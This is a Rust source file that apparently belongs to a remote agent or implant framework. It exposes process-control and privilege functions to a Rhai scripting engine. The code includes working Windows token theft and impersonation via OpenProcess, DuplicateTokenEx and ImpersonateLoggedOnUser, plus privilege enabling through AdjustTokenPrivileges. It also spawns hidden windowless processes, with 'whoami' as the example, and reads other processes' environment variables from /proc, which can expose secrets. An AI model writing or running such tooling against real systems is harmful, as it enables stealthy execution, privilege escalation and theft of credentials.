// src/agent/scripting/process.rs
use rhai::Engine;
use super::helpers::{kill_pid, proc_env, spawn_hidden};

pub fn register(engine: &mut Engine) {

    // ── Process control ───────────────────────────────────────────────────────

    engine.register_fn("internal_proc_kill", |pid_str: &str| -> String {
        match pid_str.parse::<u32>() {
            Ok(pid) => kill_pid(pid),
            Err(_)  => "Error: invalid PID".to_string(),
        }
    });

    // Spawn a process without a visible window (CREATE_NO_WINDOW on Windows).
    // args_json: JSON array of strings, e.g. ["-c", "whoami"].
    engine.register_fn("internal_spawn_hidden", |binary: &str, args_json: &str| -> String {
        spawn_hidden(binary, args_json)
    });

    // Read another process's environment variables.
    // Linux: reads /proc/{pid}/environ  |  Other platforms: returns error.
    engine.register_fn("internal_proc_env", |pid_str: &str| -> String {
        match pid_str.parse::<u32>() {
            Ok(pid) => proc_env(pid),
            Err(_)  => "Error: invalid PID".to_string(),
        }
    });

    // ── Token / privilege (Windows: real API; POSIX: lightweight equivalents) ─

    engine.register_fn("internal_is_elevated", || -> String {
        #[cfg(target_os = "windows")]
        { if unsafe { super::win_ffi::win_ext::IsUserAnAdmin() } != 0 { "true".into() } else { "false".into() } }
        #[cfg(not(target_os = "windows"))]
        { if unsafe { libc::geteuid() } == 0 { "true".into() } else { "false".into() } }
    });

    // Duplicate the token of a running process and impersonate it.
    // Windows only — no-op stub on other platforms.
    engine.register_fn("internal_token_steal", |pid_str: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            let pid: u32 = match pid_str.parse() {
                Ok(p)  => p,
                Err(_) => return "Error: invalid PID".into(),
            };
            unsafe {
                use super::win_ffi::win_ext::*;
                let h_proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
                if h_proc.is_null() {
                    return format!("Error: OpenProcess failed ({})", GetLastError());
                }
                let mut h_tok: HANDLE = std::ptr::null_mut();
                if OpenProcessToken(h_proc, TOKEN_DUPLICATE | TOKEN_QUERY, &mut h_tok) == 0 {
                    CloseHandle(h_proc);
                    return format!("Error: OpenProcessToken failed ({})", GetLastError());
                }
                let mut dup_tok: HANDLE = std::ptr::null_mut();
                let ok = DuplicateTokenEx(
                    h_tok, TOKEN_ALL_ACCESS, std::ptr::null_mut(),
                    SECURITY_IMPERSONATION, TOKEN_TYPE_IMPERSONATION, &mut dup_tok,
                );
                CloseHandle(h_tok);
                CloseHandle(h_proc);
                if ok == 0 {
                    return format!("Error: DuplicateTokenEx failed ({})", GetLastError());
                }
                let imp_ok = ImpersonateLoggedOnUser(dup_tok);
                CloseHandle(dup_tok);
                if imp_ok != 0 { format!("Impersonating PID {}", pid) }
                else { format!("Error: ImpersonateLoggedOnUser failed ({})", GetLastError()) }
            }
        }
        #[cfg(not(target_os = "windows"))]
        format!("Error: token_steal is Windows only (pid {})", pid_str)
    });

    // Enable an SE_* privilege on the current process token.
    // Windows only — no-op stub on other platforms.
    engine.register_fn("internal_enable_privilege", |priv_name: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            let name = match CString::new(priv_name) {
                Ok(s)  => s,
                Err(_) => return "Error: invalid privilege name".into(),
            };
            unsafe {
                use super::win_ffi::win_ext::*;
                let mut h_tok: HANDLE = std::ptr::null_mut();
                if OpenProcessToken(
                    GetCurrentProcess(), TOKEN_ADJUST_PRIVS | TOKEN_QUERY, &mut h_tok,
                ) == 0 {
                    return format!("Error: OpenProcessToken failed ({})", GetLastError());
                }
                let mut luid = Luid { low: 0, high: 0 };
                if LookupPrivilegeValueA(std::ptr::null(), name.as_ptr(), &mut luid) == 0 {
                    CloseHandle(h_tok);
                    return format!("Error: LookupPrivilegeValue failed ({})", GetLastError());
                }
                let tp = TokenPrivileges {
                    count:      1,
                    privileges: [LuidAndAttribs { luid, attrs: SE_PRIVILEGE_ENABLED }],
                };
                let ok = AdjustTokenPrivileges(
                    h_tok, 0, &tp, 0, std::ptr::null_mut(), std::ptr::null_mut(),
                );
                CloseHandle(h_tok);
                if ok != 0 { format!("Enabled: {}", priv_name) }
                else { format!("Error: AdjustTokenPrivileges failed ({})", GetLastError()) }
            }
        }
        #[cfg(not(target_os = "windows"))]
        format!("Error: enable_privilege is Windows only ({})", priv_name)
    });
}
